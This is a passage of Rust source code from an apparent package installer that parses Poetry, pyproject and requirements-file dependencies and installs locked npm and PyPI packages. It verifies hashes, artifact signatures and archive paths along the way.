        .collect::<BTreeMap<_, _>>();
    let mut selected_groups = project_extras.clone();
    if include_dev_dependencies {
        selected_groups.insert("dev".to_owned());
    }

    let mut requirements = ProjectRequirements::default();
    for group in selected_groups {
        if dependency_groups.contains_key(&group) {
            collect_pyproject_dependency_group(
                &group,
                &dependency_groups,
                &mut BTreeSet::new(),
                &mut requirements,
                base_dir,
                local_sources,
            )?;
        }
    }
    Ok(requirements)
}

fn collect_pyproject_dependency_group(
    group: &str,
    dependency_groups: &BTreeMap<String, Vec<PyProjectDependencyGroupItem>>,
    stack: &mut BTreeSet<String>,
    requirements: &mut ProjectRequirements,
    base_dir: &Path,
    local_sources: &BTreeMap<String, PathBuf>,
) -> Result<()> {
    if !stack.insert(group.to_owned()) {
        return Err(OmcRegistryError::UnsupportedRequirement(format!(
            "cyclic dependency group include `{group}`"
        )));
    }

    let Some(items) = dependency_groups.get(group) else {
        return Err(OmcRegistryError::UnsupportedRequirement(format!(
            "unknown dependency group `{group}`"
        )));
    };

    for item in items {
        match item {
            PyProjectDependencyGroupItem::Requirement(requirement) => {
                collect_pypi_project_requirement(
                    requirements,
                    requirement,
                    &BTreeSet::new(),
                    base_dir,
                    local_sources,
                )?;
            }
            PyProjectDependencyGroupItem::Include { include_group } => {
                let include_group = normalize_pypi_extra(include_group);
                collect_pyproject_dependency_group(
                    &include_group,
                    dependency_groups,
                    stack,
                    requirements,
                    base_dir,
                    local_sources,
                )?;
            }
        }
    }

    stack.remove(group);
    Ok(())
}

fn read_poetry_dependencies(
    dependencies: &BTreeMap<String, PoetryDependency>,
    extras: &BTreeMap<String, Vec<String>>,
    project_extras: &BTreeSet<String>,
    base_dir: &Path,
) -> Result<ProjectRequirements> {
    let selected_optional_names = extras
        .iter()
        .filter(|(extra, _)| project_extras.contains(&normalize_pypi_extra(extra)))
        .flat_map(|(_, names)| names.iter().map(|name| normalize_pypi_name(name)))
        .collect::<BTreeSet<_>>();
    let mut requirements = ProjectRequirements::default();

    for (name, dependency) in dependencies {
        let name = normalize_pypi_name(name);
        if name == "python" {
            continue;
        }
        if poetry_dependency_optional(dependency) && !selected_optional_names.contains(&name) {
            continue;
        }
        if let Some(requirement) = poetry_dependency_requirement(&name, dependency, base_dir)? {
            match requirement {
                PoetryDependencyRequirement::Spec(spec) => requirements.specs.push(spec),
                PoetryDependencyRequirement::LocalPath(path) => {
                    requirements.python_local_paths.push(path)
                }
                PoetryDependencyRequirement::Vcs(vcs) => {
                    requirements.python_vcs_requirements.push(vcs)
                }
            }
        }
    }

    Ok(requirements)
}

fn collect_poetry_sources(sources: &[PoetrySource], requirements: &mut ProjectRequirements) {
    for source in sources {
        let Some(index_url) = source
            .url
            .as_deref()
            .and_then(normalize_pypi_simple_index_url)
        else {
            continue;
        };
        push_project_pypi_index_url(requirements, index_url);
    }
}

fn read_poetry_lock_requirements(path: &Path) -> Result<ProjectRequirements> {
    let lock = toml::from_str::<PoetryLock>(&fs::read_to_string(path)?)?;
    let mut requirements = ProjectRequirements::default();

    for package in lock.package {
        let name = normalize_pypi_name(&package.name);
        let key = format!("pypi:{name}");
        requirements
            .constraints
            .insert(key.clone(), package.version);
        for file in package.files {
            if let Some(hash) = normalize_sha256_hash(&file.hash) {
                requirements
                    .hashes
                    .entry(key.clone())
                    .or_default()
                    .insert(hash);
            }
        }
    }

    for (name, files) in lock.metadata.files {
        let key = format!("pypi:{}", normalize_pypi_name(&name));
        for file in files {
            if let Some(hash) = normalize_sha256_hash(&file.hash) {
                requirements
                    .hashes
                    .entry(key.clone())
                    .or_default()
                    .insert(hash);
            }
        }
    }

    Ok(requirements)
}

fn poetry_dependency_optional(dependency: &PoetryDependency) -> bool {
    match dependency {
        PoetryDependency::Version(_) => false,
        PoetryDependency::Table(table) => table.optional,
    }
}

enum PoetryDependencyRequirement {
    Spec(PackageSpec),
    LocalPath(PathBuf),
    Vcs(PythonVcsRequirement),
}

fn poetry_dependency_requirement(
    name: &str,
    dependency: &PoetryDependency,
    base_dir: &Path,
) -> Result<Option<PoetryDependencyRequirement>> {
    let version = match dependency {
        PoetryDependency::Version(version) => version.as_str(),
        PoetryDependency::Table(table) => {
            if let Some(git) = table.git.as_deref() {
                let reference = python_vcs_table_reference(
                    table.reference.clone(),
                    table.rev.clone(),
                    table.branch.clone(),
                    table.tag.clone(),
                );
                let subdirectory = table.subdirectory.as_deref().map(PathBuf::from);
                let mut vcs = parse_python_vcs_requirement(
                    Some((
                        name.to_owned(),
                        normalized_pypi_extras(table.extras.clone()),
                    )),
                    git,
                    reference,
                    true,
                )?
                .ok_or_else(|| {
                    OmcRegistryError::UnsupportedSpec(format!(
                        "unsupported Poetry dependency source for `{name}`"
                    ))
                })?;
                if vcs.subdirectory.is_none() {
                    vcs.subdirectory = subdirectory;
                }
                return Ok(Some(PoetryDependencyRequirement::Vcs(vcs)));
            }
            if let Some(url) = &table.url {
                return Ok(Some(PoetryDependencyRequirement::Spec(
                    PackageSpec::with_direct_url(
                        Ecosystem::Pypi,
                        name.to_owned(),
                        url.to_owned(),
                        BTreeSet::new(),
                    ),
                )));
            }
            if let Some(path) = table.file.as_deref() {
                return poetry_local_archive_dependency_spec(name, path, base_dir)
                    .map(PoetryDependencyRequirement::Spec)
                    .map(Some);
            }
            if let Some(path) = table.path.as_deref() {
                return poetry_local_path_dependency(name, path, base_dir).map(Some);
            }
            table.version.as_deref().unwrap_or("*")
        }
    };
    Ok(poetry_version_requirement(name, version).map(|version| {
        PoetryDependencyRequirement::Spec(PackageSpec::new(
            Ecosystem::Pypi,
            name.to_owned(),
            (!version.is_empty()).then_some(version),
        ))
    }))
}

fn poetry_local_path_dependency(
    name: &str,
    path: &str,
    base_dir: &Path,
) -> Result<PoetryDependencyRequirement> {
    let path = resolved_local_path(path, base_dir);
    if path
        .file_name()
        .and_then(|name| name.to_str())
        .map(is_pypi_archive_filename)
        .unwrap_or(false)
    {
        let url = reqwest::Url::from_file_path(&path).map_err(|_| {
            OmcRegistryError::UnsupportedSpec(format!(
                "unsupported Poetry dependency source for `{name}`"
            ))
        })?;
        return Ok(PoetryDependencyRequirement::Spec(
            PackageSpec::with_direct_url(
                Ecosystem::Pypi,
                name.to_owned(),
                url.to_string(),
                BTreeSet::new(),
            ),
        ));
    }
    if path.is_dir() {
        return Ok(PoetryDependencyRequirement::LocalPath(path));
    }

    Err(OmcRegistryError::UnsupportedSpec(format!(
        "unsupported Poetry dependency source for `{name}`"
    )))
}

fn resolved_local_path(path: &str, base_dir: &Path) -> PathBuf {
    let path = Path::new(path);
    if path.is_absolute() {
        path.to_path_buf()
    } else {
        base_dir.join(path)
    }
}

fn poetry_local_archive_dependency_spec(
    name: &str,
    path: &str,
    base_dir: &Path,
) -> Result<PackageSpec> {
    let path = resolved_local_path(path, base_dir);
    if !path
        .file_name()
        .and_then(|name| name.to_str())
        .map(is_pypi_archive_filename)
        .unwrap_or(false)
    {
        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "unsupported Poetry dependency source for `{name}`"
        )));
    }
    let url = reqwest::Url::from_file_path(&path).map_err(|_| {
        OmcRegistryError::UnsupportedSpec(format!(
            "unsupported Poetry dependency source for `{name}`"
        ))
    })?;
    Ok(PackageSpec::with_direct_url(
        Ecosystem::Pypi,
        name.to_owned(),
        url.to_string(),
        BTreeSet::new(),
    ))
}

fn poetry_version_requirement(_name: &str, version: &str) -> Option<String> {
    let version = version.trim();
    if version.is_empty() {
        return None;
    }
    if version == "*" {
        return Some(String::new());
    }
    if let Some(base) = version.strip_prefix('^') {
        return poetry_caret_requirement(base);
    }
    if let Some(base) = version.strip_prefix('~') {
        return poetry_tilde_requirement(base);
    }
    Some(version.replace(' ', ""))
}

fn poetry_caret_requirement(base: &str) -> Option<String> {
    let lower = normalize_poetry_partial_version(base)?;
    let parts = version_parts(&lower);
    let upper = match parts.as_slice() {
        [0, 0, patch, ..] => format!("0.0.{}", patch + 1),
        [0, minor, ..] => format!("0.{}", minor + 1),
        [major, ..] => format!("{}", major + 1),
        _ => return None,
    };
    Some(format!(">={lower},<{upper}"))
}

fn poetry_tilde_requirement(base: &str) -> Option<String> {
    let lower = normalize_poetry_partial_version(base)?;
    let parts = version_parts(&lower);
    let upper = match parts.as_slice() {
        [major] => format!("{}", major + 1),
        [major, minor, ..] => format!("{}.{}", major, minor + 1),
        _ => return None,
    };
    Some(format!(">={lower},<{upper}"))
}

fn normalize_poetry_partial_version(version: &str) -> Option<String> {
    let parts = version_parts(version);
    if parts.is_empty() {
        None
    } else {
        Some(
            parts
                .iter()
                .map(ToString::to_string)
                .collect::<Vec<_>>()
                .join("."),
        )
    }
}

fn version_parts(version: &str) -> Vec<u64> {
    version
        .split('.')
        .filter_map(|part| part.parse::<u64>().ok())
        .collect()
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
enum RequirementsMode {
    Install,
    Constraint,
}

#[derive(Debug, Clone)]
struct RequirementsInclude {
    path: String,
    mode: RequirementsMode,
}

fn read_requirements_file_inner(
    path: &Path,
    mode: RequirementsMode,
    seen: &mut BTreeSet<(RequirementsMode, PathBuf)>,
    discovered: &mut ProjectRequirements,
) -> Result<()> {
    let seen_key = fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
    if !seen.insert((mode, seen_key)) {
        return Ok(());
    }

    let base_dir = path.parent().unwrap_or_else(|| Path::new("."));
    for raw_line in requirement_logical_lines(&fs::read_to_string(path)?) {
        let line = raw_line.trim();
        if line.is_empty() {
            continue;
        }

        if let Some(include) = parse_requirements_include(line) {
            read_requirements_file_inner(
                &base_dir.join(include.path),
                include.mode,
                seen,
                discovered,
            )?;
            continue;
        }

        if let Some(index_url) = parse_requirements_index_url(line) {
            if mode == RequirementsMode::Install {
                discovered.pypi_index_url = Some(index_url);
            }
            continue;
        }

        if let Some(index_url) = parse_requirements_extra_index_url(line) {
            if mode == RequirementsMode::Install {
                discovered.pypi_extra_index_urls.push(index_url);
            }
            continue;
        }

        if let Some(find_links) = parse_requirements_find_links(line, base_dir) {
            if mode == RequirementsMode::Install {
                discovered.pypi_find_links.push(find_links);
            }
            continue;
        }

        if parse_requirements_no_index(line) {
            if mode == RequirementsMode::Install {
                discovered.pypi_no_index = true;
            }
            continue;
        }

        if parse_requirements_require_hashes(line) {
            if mode == RequirementsMode::Install {
                discovered.pypi_require_hashes = true;
            }
            continue;
        }

        if parse_requirements_compatible_global_option(line) {
            continue;
        }

        if let Some(editable) = parse_requirements_editable_value(line) {
            if mode == RequirementsMode::Constraint {
                return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
            }
            if let Some(vcs) = parse_requirements_editable_vcs_requirement(&editable)? {
                discovered.python_vcs_requirements.push(vcs);
                continue;
            }
            discovered
                .python_local_paths
                .push(normalize_requirements_editable_path(&editable, base_dir)?);
            continue;
        }

        if line.starts_with('-') {
            return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
        }

        let parsed = parse_requirement_line(line);
        if let Some(vcs) =
            parse_requirements_bare_vcs_requirement(&parsed.requirement, &BTreeSet::new())?
        {
            if mode == RequirementsMode::Constraint || !parsed.hashes.is_empty() {
                return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
            }
            discovered.python_vcs_requirements.push(vcs);
            continue;
        }

        if let Some(vcs) = parse_pypi_vcs_direct_requirement(&parsed.requirement, &BTreeSet::new())?
        {
            if mode == RequirementsMode::Constraint || !parsed.hashes.is_empty() {
                return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
            }
            discovered.python_vcs_requirements.push(vcs);
            continue;
        }

        let direct_requirement =
            parse_pypi_direct_requirement(&parsed.requirement, &BTreeSet::new()).or(
                parse_pypi_local_direct_requirement(
                    &parsed.requirement,
                    &BTreeSet::new(),
                    base_dir,
                )?,
            );
        if let Some((spec, hashes)) = direct_requirement {
            if mode == RequirementsMode::Constraint {
                return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
            }
            if let Some(path) = pypi_direct_file_url_local_directory(spec.direct_url.as_deref())? {
                if !parsed.hashes.is_empty() || !hashes.is_empty() {
                    return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
                }
                discovered.python_local_paths.push(path);
                continue;
            }
            if !parsed.hashes.is_empty() || !hashes.is_empty() {
                discovered
                    .hashes
                    .entry(spec.constraint_key())
                    .or_default()
                    .extend(parsed.hashes.into_iter().chain(hashes));
            }
            discovered.specs.push(spec);
            continue;
        }

        if let Some(path) = parse_pypi_local_direct_path_requirement(
            &parsed.requirement,
            &BTreeSet::new(),
            base_dir,
        )? {
            if mode == RequirementsMode::Constraint {
                return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
            }
            if !parsed.hashes.is_empty() {
                return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
            }
            discovered.python_local_paths.push(path);
            continue;
        }

        if let Some(path) =
            parse_pypi_local_path_requirement(&parsed.requirement, &BTreeSet::new(), base_dir)?
        {
            if mode == RequirementsMode::Constraint {
                return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
            }
            if !parsed.hashes.is_empty() {
                return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
            }
            discovered.python_local_paths.push(path);
            continue;
        }

        if let Some((spec, hashes)) =
            parse_pypi_local_archive_requirement(&parsed.requirement, base_dir)?
        {
            if mode == RequirementsMode::Constraint {
                return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
            }
            if !parsed.hashes.is_empty() || !hashes.is_empty() {
                discovered
                    .hashes
                    .entry(spec.constraint_key())
                    .or_default()
                    .extend(parsed.hashes.into_iter().chain(hashes));
            }
            discovered.specs.push(spec);
            continue;
        }

        if pypi_direct_reference_applies(&parsed.requirement, &BTreeSet::new()) {
            return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
        }

        if parsed.requirement.contains("://") {
            return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
        }

        if let Some(spec) = parse_pypi_requirement(&parsed.requirement) {
            match mode {
                RequirementsMode::Install => {
                    if !parsed.hashes.is_empty() {
                        discovered
                            .hashes
                            .entry(spec.constraint_key())
                            .or_default()
                            .extend(parsed.hashes);
                    }
                    discovered.specs.push(spec);
                }
                RequirementsMode::Constraint => {
                    if let Some(version) = spec.version.clone() {
                        discovered
                            .constraints
                            .insert(spec.constraint_key(), version);
                    }
                }
            }
        }
    }
    Ok(())
}

fn requirement_logical_lines(content: &str) -> Vec<String> {
    let mut lines = Vec::new();
    let mut current = String::new();

    for raw_line in content.lines() {
        let mut line = strip_requirement_comment(raw_line).trim_end().to_owned();
        let continued = line.ends_with('\\');
        if continued {
            line.pop();
        }
        let line = line.trim();
        if !line.is_empty() {
            if !current.is_empty() {
                current.push(' ');
            }
            current.push_str(line);
        }
        if !continued && !current.trim().is_empty() {
            lines.push(std::mem::take(&mut current));
        }
    }

    if !current.trim().is_empty() {
        lines.push(current);
    }

    lines
}

fn strip_requirement_comment(line: &str) -> &str {
    let trimmed = line.trim_start();
    if trimmed.starts_with('#') {
        return "";
    }

    let mut quote = None;
    let mut previous_was_whitespace = false;
    for (index, ch) in line.char_indices() {
        if matches!(ch, '\'' | '"') {
            if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() {
                quote = Some(ch);
            }
        } else if ch == '#' && quote.is_none() && previous_was_whitespace {
            return &line[..index];
        }
        previous_was_whitespace = ch.is_whitespace();
    }
    line
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
struct ParsedRequirementLine {
    requirement: String,
    hashes: BTreeSet<String>,
}

fn parse_requirement_line(line: &str) -> ParsedRequirementLine {
    let (requirement, options) = match first_pip_option_start(line) {
        Some(index) => (line[..index].trim(), line[index..].trim()),
        None => (line.trim(), ""),
    };
    let mut parsed = ParsedRequirementLine {
        requirement: requirement.to_owned(),
        hashes: BTreeSet::new(),
    };

    let tokens = shell_like_tokens(options);
    let mut index = 0;
    while index < tokens.len() {
        let token = &tokens[index];
        let hash = if let Some(hash) = token.strip_prefix("--hash=") {
            Some(hash)
        } else if token == "--hash" {
            index += 1;
            tokens.get(index).map(String::as_str)
        } else {
            None
        };

        if let Some(hash) = hash.and_then(normalize_sha256_hash) {
            parsed.hashes.insert(hash);
        }
        index += 1;
    }

    parsed
}

fn first_pip_option_start(line: &str) -> Option<usize> {
    let mut quote = None;
    let mut index = 0;

    while index < line.len() {
        let ch = line[index..].chars().next().unwrap_or_default();
        let ch_len = ch.len_utf8();

        if matches!(ch, '\'' | '"') {
            if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() {
                quote = Some(ch);
            }
        }

        if quote.is_none() && ch.is_whitespace() {
            let rest = line[index..].trim_start();
            if rest.starts_with('-') {
                return Some(index);
            }
        }

        index += ch_len;
    }

    None
}

fn shell_like_tokens(value: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut quote = None;

    for ch in value.chars() {
        if matches!(ch, '\'' | '"') {
            if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() {
                quote = Some(ch);
            } else {
                current.push(ch);
            }
            continue;
        }

        if quote.is_none() && ch.is_whitespace() {
            if !current.is_empty() {
                tokens.push(std::mem::take(&mut current));
            }
        } else {
            current.push(ch);
        }
    }

    if !current.is_empty() {
        tokens.push(current);
    }

    tokens
}

fn normalize_sha256_hash(value: &str) -> Option<String> {
    let hash = value.strip_prefix("sha256:")?.to_ascii_lowercase();
    (hash.len() == 64 && hash.chars().all(|ch| ch.is_ascii_hexdigit())).then_some(hash)
}

fn enforce_requirements_hashes(requirements: &ProjectRequirements) -> Result<()> {
    enforce_pypi_hashes_for_specs(
        &requirements.specs,
        &requirements.hashes,
        &requirements.constraints,
    )
}

fn enforce_pypi_hashes_for_specs(
    specs: &[PackageSpec],
    hashes: &BTreeMap<String, BTreeSet<String>>,
    constraints: &BTreeMap<String, String>,
) -> Result<()> {
    for spec in specs
        .iter()
        .filter(|spec| spec.ecosystem == Ecosystem::Pypi)
    {
        if !hashes.contains_key(&spec.constraint_key()) {
            return Err(OmcRegistryError::UnsupportedRequirement(format!(
                "--require-hashes needs a hash for `{}`",
                spec.requested()
            )));
        }

        if spec.direct_url.is_none() {
            let requirement = constrained_pypi_requirement(spec, constraints).unwrap_or_default();
            if !is_exact_pypi_requirement(&requirement) {
                return Err(OmcRegistryError::UnsupportedRequirement(format!(
                    "--require-hashes needs an exact pin for `{}`",
                    spec.requested()
                )));
            }
        }
    }
    Ok(())
}

fn is_exact_pypi_requirement(requirement: &str) -> bool {
    requirement
        .split(',')
        .any(|part| part.trim_start().starts_with("==") || part.trim_start().starts_with("==="))
}

pub fn install_locked_packages(project_dir: impl AsRef<Path>) -> Result<InstallReport> {
    let project_dir = project_dir.as_ref();
    let lock = read_lockfile(project_dir.join(LOCKFILE))?;
    let mut project =
        discover_project_requirements_with_options(project_dir, &BTreeSet::new(), true)?;
    if !project.python_vcs_requirements.is_empty() {
        let vcs_requirements = resolve_python_vcs_requirements(
            project_dir,
            &project.python_vcs_requirements,
            Some(&lock.python_vcs),
        )?;
        extend_project_requirements(&mut project, vcs_requirements.requirements);
    }
    let mut report = install_lock(project_dir, &lock)?;
    report.npm_bins +=
        install_npm_project_links(project_dir, &report.node_modules, &report.npm_bin_dir, true)?;
    report.python_scripts += install_python_local_paths(
        &project.python_local_paths,
        &report.python_site_packages,
        &report.python_bin_dir,
    )?;
    Ok(report)
}

fn install_lock(project_dir: &Path, lock: &OmcLock) -> Result<InstallReport> {
    let node_modules = project_dir.join("node_modules");
    let npm_bin_dir = node_modules.join(".bin");
    let python_site_packages = project_dir
        .join(".omc")
        .join("python")
        .join("site-packages");
    let python_bin_dir = project_dir.join(".omc").join("python").join("bin");
    let python_sdists_dir = project_dir.join(".omc").join("python").join("sdists");
    let python_local_paths = python_local_paths_file(project_dir);

    remove_path_if_exists(&node_modules)?;
    remove_path_if_exists(&python_site_packages)?;
    remove_path_if_exists(&python_bin_dir)?;
    remove_path_if_exists(&python_sdists_dir)?;
    remove_path_if_exists(&python_local_paths)?;

    fs::create_dir_all(&node_modules)?;
    fs::create_dir_all(&npm_bin_dir)?;
    fs::create_dir_all(&python_site_packages)?;
    fs::create_dir_all(&python_bin_dir)?;
    fs::create_dir_all(&python_sdists_dir)?;

    let mut report = InstallReport {
        npm_packages: 0,
        pypi_packages: 0,
        npm_bins: 0,
        python_scripts: 0,
        node_modules,
        npm_bin_dir,
        python_site_packages,
        python_bin_dir,
    };

    for package in &lock.packages {
        if package.verdict != Verdict::Accepted {
            return Err(OmcRegistryError::BlockedLockedPackage(format!(
                "{}:{}@{}",
                package.ecosystem, package.name, package.version
            )));
        }
        verify_locked_artifact(project_dir, package)?;

        match package.ecosystem {
            Ecosystem::Npm => {
                report.npm_bins += install_npm_package(
                    project_dir,
                    package,
                    &report.node_modules,
                    &report.npm_bin_dir,
                )?;
                report.npm_packages += 1;
            }
            Ecosystem::Pypi => {
                report.python_scripts += install_pypi_package(
                    project_dir,
                    package,
                    &report.python_site_packages,
                    &report.python_bin_dir,
                )?;
                report.pypi_packages += 1;
            }
        }
    }

    install_nested_npm_dependencies(project_dir, lock, &report.node_modules)?;

    Ok(report)
}

fn install_python_local_paths(
    local_paths: &[PathBuf],
    site_packages: &Path,
    bin_dir: &Path,
) -> Result<usize> {
    let mut lines = BTreeSet::new();
    let mut entry_points = Vec::new();
    for path in local_paths {
        let path = fs::canonicalize(path).map_err(|error| {
            OmcRegistryError::UnsupportedRequirement(format!(
                "editable path `{}` could not be resolved: {error}",
                path.display()
            ))
        })?;
        if !path.is_dir() {
            return Err(OmcRegistryError::UnsupportedRequirement(format!(
                "editable path `{}` must be a directory",
                path.display()
            )));
        }
        entry_points.extend(read_python_local_entry_points(&path)?);
        let import_path = if path.join("src").is_dir() {
            path.join("src")
        } else {
            path
        };
        let line = import_path.to_string_lossy();
        if line.contains('\n') || line.contains('\r') {
            return Err(OmcRegistryError::UnsupportedRequirement(format!(
                "editable path `{}` contains a newline",
                import_path.display()
            )));
        }
        lines.insert(line.into_owned());
    }

    if lines.is_empty() {
        return Ok(0);
    }

    let local_paths_file = site_packages
        .parent()
        .map(|python_dir| python_dir.join("local-paths"))
        .ok_or_else(|| {
            OmcRegistryError::UnsupportedSpec("missing python install directory".to_owned())
        })?;
    fs::write(
        local_paths_file,
        format!("{}\n", lines.into_iter().collect::<Vec<_>>().join("\n")),
    )?;
    install_python_entry_point_scripts(&entry_points, bin_dir)
}

fn python_local_paths_file(project_dir: &Path) -> PathBuf {
    project_dir.join(".omc").join("python").join("local-paths")
}

fn read_locked_archive(project_dir: &Path, package: &LockedPackage) -> Result<Vec<u8>> {
    let archive_path = project_dir.join(&package.archive);
    let bytes = fs::read(&archive_path)?;
    let actual = sha256_hex(&bytes);
    if !package.sha256.eq_ignore_ascii_case(&actual) {
        return Err(OmcRegistryError::DigestMismatch {
            name: package.name.clone(),
            expected: format!("sha256:{}", package.sha256),
            actual: format!("sha256:{actual}"),
        });
    }
    Ok(bytes)
}

fn verify_locked_artifact(project_dir: &Path, package: &LockedPackage) -> Result<()> {
    let artifact_path = checked_join(project_dir, Path::new(&package.artifact))?;
    let artifact = serde_json::from_str::<OmcArtifact>(&fs::read_to_string(&artifact_path)?)?;
    verify_artifact_signature(&artifact)?;
    if artifact.package.ecosystem != package.ecosystem
        || artifact.package.name != package.name
        || artifact.package.version != package.version
        || artifact.source_url != package.source_url
        || artifact.source_sha256 != package.sha256
        || artifact.behavior != package.behavior
        || artifact.verdict != package.verdict
    {
        return Err(OmcRegistryError::UnsupportedInstallArtifact(format!(
            "artifact `{}` does not match lock entry for {}:{}@{}",
            package.artifact, package.ecosystem, package.name, package.version
        )));
    }
    Ok(())
}

fn install_npm_package(
    project_dir: &Path,
    package: &LockedPackage,
    node_modules: &Path,
    bin_dir: &Path,
) -> Result<usize> {
    let target = install_npm_package_to(project_dir, package, node_modules)?;
    install_npm_bins(&target, &package.name, bin_dir)
}

fn install_npm_package_to(
    project_dir: &Path,
    package: &LockedPackage,
    node_modules: &Path,
) -> Result<PathBuf> {
    let bytes = read_locked_archive(project_dir, package)?;
    let target = npm_install_target(node_modules, &package.name);
    if target.exists() {
        fs::remove_dir_all(&target)?;
    }
    fs::create_dir_all(&target)?;

    let decoder = GzDecoder::new(Cursor::new(bytes));
    let mut archive = Archive::new(decoder);
    for entry in archive.entries()? {
        let mut entry = entry?;
        let raw_path = entry.path()?.to_string_lossy().into_owned();
        if is_ignorable_archive_metadata_path(&raw_path) {
            continue;
        }
        let Some(stripped) = strip_first_path_component(Path::new(&raw_path)) else {
            if entry.header().entry_type().is_dir() {
                continue;
            }
            return Err(OmcRegistryError::UnsafeArchivePath(raw_path));
        };
        let output = checked_join(&target, &stripped)?;

        if entry.header().entry_type().is_dir() {
            fs::create_dir_all(output)?;
        } else if entry.header().entry_type().is_file() {
            if let Some(parent) = output.parent() {
                fs::create_dir_all(parent)?;
            }
            entry.unpack(output)?;
        }
    }

    Ok(target)
}

fn install_nested_npm_dependencies(
    project_dir: &Path,
    lock: &OmcLock,
    node_modules: &Path,
) -> Result<()> {
    for package in lock
        .packages
        .iter()
        .filter(|package| package.ecosystem == Ecosystem::Npm)
    {
        let parent = npm_install_target(node_modules, &package.name);
        install_nested_npm_dependencies_for_package(
            project_dir,
            lock,
            &parent,
            package,
            &mut Vec::new(),
        )?;
    }

    Ok(())
}

fn install_npm_project_links(
    project_dir: &Path,
    node_modules: &Path,
    bin_dir: &Path,
    include_dev_dependencies: bool,
) -> Result<usize> {
    Ok(install_npm_root_bins(project_dir, bin_dir)?
        + install_npm_workspace_links(project_dir, node_modules, bin_dir)?
        + install_npm_local_dependency_links(
            project_dir,
            node_modules,
            bin_dir,
            include_dev_dependencies,
        )?)
}

fn install_npm_direct_local_links(
    paths: &[PathBuf],
    node_modules: &Path,
    bin_dir: &Path,
) -> Result<usize> {
    let mut count = 0;
    let mut seen = BTreeSet::new();
    for path in paths {
        if !seen.insert(path.to_string_lossy().into_owned()) {
            continue;
        }
        if !path.is_dir() {
            return Err(OmcRegistryError::UnsupportedSpec(format!(
                "local npm path `{}` must point to an existing directory",
                path.display()
            )));
        }
        let package_json = path.join("package.json");
        if !package_json.exists() {
            return Err(OmcRegistryError::UnsupportedSpec(format!(
                "local npm path `{}` must contain package.json",
                path.display()
            )));
        }
        let package =
            serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(&package_json)?)?;
        let Some(name) = package.name.as_deref().filter(|name| !name.is_empty()) else {
            return Err(OmcRegistryError::UnsupportedSpec(format!(
                "local npm path `{}` package.json must declare name",
                path.display()
            )));
        };
        let target = npm_install_target(node_modules, name);
        remove_path_if_exists(&target)?;
        if let Some(parent) = target.parent() {
            fs::create_dir_all(parent)?;
        }
        create_directory_link(path, &target)?;
        count += install_npm_bins(path, name, bin_dir)?;
    }
    Ok(count)
}

fn install_npm_root_bins(project_dir: &Path, bin_dir: &Path) -> Result<usize> {
    let package_json = project_dir.join("package.json");
    if !package_json.exists() {
        return Ok(0);
    }

    let package =
        serde_json::from_str::<NpmInstalledPackageJson>(&fs::read_to_string(package_json)?)?;
    let package_name = package.name.as_deref().unwrap_or("");
    if package.bin.is_none() {
        return Ok(0);
    }

    install_npm_bins(project_dir, package_name, bin_dir)
}

fn install_npm_workspace_links(
    project_dir: &Path,
    node_modules: &Path,
    bin_dir: &Path,
) -> Result<usize> {
    let package_json = project_dir.join("package.json");
    if !package_json.exists() {
        return Ok(0);
    }

    let root = serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(&package_json)?)?;
    let Some(workspaces) = root.workspaces else {
        return Ok(0);
    };

    let mut count = 0;
    for package_json in workspace_package_json_paths(project_dir, &workspaces) {
        let workspace_dir = package_json.parent().unwrap_or(project_dir);
        let workspace =
            serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(&package_json)?)?;
        let Some(name) = workspace.name.as_deref().filter(|name| !name.is_empty()) else {
            continue;
        };
        let target = npm_install_target(node_modules, name);
        remove_path_if_exists(&target)?;
        if let Some(parent) = target.parent() {
            fs::create_dir_all(parent)?;
        }
        create_directory_link(workspace_dir, &target)?;
        count += install_npm_bins(workspace_dir, name, bin_dir)?;
    }

    Ok(count)
}

fn install_npm_local_dependency_links(
    project_dir: &Path,
    node_modules: &Path,
    bin_dir: &Path,
    include_dev_dependencies: bool,
) -> Result<usize> {
    let mut count = 0;
    for package_json in npm_project_package_jsons(project_dir)? {
        let base_dir = package_json.parent().unwrap_or(project_dir);
        let package =
            serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(&package_json)?)?;
        let mut links = Vec::new();
        collect_npm_local_dependency_links(
            &package,
            include_dev_dependencies,
            base_dir,
            &mut links,
        )?;
        for link in links {
            let target = npm_install_target(node_modules, &link.name);
            remove_path_if_exists(&target)?;
            if let Some(parent) = target.parent() {
                fs::create_dir_all(parent)?;
            }
            create_directory_link(&link.path, &target)?;
            count += install_npm_bins(&link.path, &link.name, bin_dir)?;
        }
    }
    Ok(count)
}

fn npm_project_package_jsons(project_dir: &Path) -> Result<Vec<PathBuf>> {
    let package_json = project_dir.join("package.json");
    if !package_json.exists() {
        return Ok(Vec::new());
    }

    let root = serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(&package_json)?)?;
    let mut package_jsons = vec![package_json];
    if let Some(workspaces) = root.workspaces {
        package_jsons.extend(workspace_package_json_paths(project_dir, &workspaces));
    }
    Ok(package_jsons)
}

#[derive(Debug)]
struct NpmLocalLink {
    name: String,
    path: PathBuf,
}

fn collect_npm_local_dependency_links(
    package: &ProjectPackageJson,
    include_dev_dependencies: bool,
    base_dir: &Path,
    links: &mut Vec<NpmLocalLink>,
) -> Result<()> {
